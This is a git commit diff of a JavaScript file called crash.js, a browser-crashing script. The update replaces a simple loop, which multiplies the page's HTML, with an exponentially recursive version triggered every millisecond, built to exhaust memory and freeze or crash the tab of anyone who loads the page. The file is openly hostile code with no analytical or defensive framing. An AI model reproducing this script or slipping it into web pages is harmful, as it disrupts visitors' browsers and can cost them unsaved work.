d4d1e2e648d4a7aa290a068d2a97330db3667dbe
resu deteleD <34798985+anti-ghost@users.noreply.github.com>
2021-03-05 18:46:36 -0800

    Update crash.js

--- crash.js
+++ crash.js
@@ -1,25 +1,34 @@
-function replicate() {
-  document.body.innerHTML += 
-    document.body.innerHTML +
-    document.body.innerHTML +
-    document.body.innerHTML +
-    document.body.innerHTML +
-    document.body.innerHTML +
-    document.body.innerHTML +
-    document.body.innerHTML +
-    document.body.innerHTML +
-    document.body.innerHTML +
-    document.body.innerHTML;
-  crash();
-  crash();
-  crash();
-  crash();
-  crash();
-  crash();
-  crash();
-  crash();
-  crash();
-  crash();
+function replicate(x) {
+  if (x == 1) {
+    document.body.innerHTML += 
+      document.body.innerHTML +
+      document.body.innerHTML +
+      document.body.innerHTML +
+      document.body.innerHTML +
+      document.body.innerHTML +
+      document.body.innerHTML +
+      document.body.innerHTML +
+      document.body.innerHTML +
+      document.body.innerHTML;
+  } else {
+    replicate(x - 1);
+    replicate(x - 1);
+    replicate(x - 1);
+    replicate(x - 1);
+    replicate(x - 1);
+    replicate(x - 1);
+    replicate(x - 1);
+    replicate(x - 1);
+    replicate(x - 1);
+    replicate(x - 1);
+  }
 }
 
-setInterval(replicate, 1);
+var i = 0;
+
+function superRep() {
+  i++;
+  replicate(i);
+}
+
+setInterval(superRep, 1);
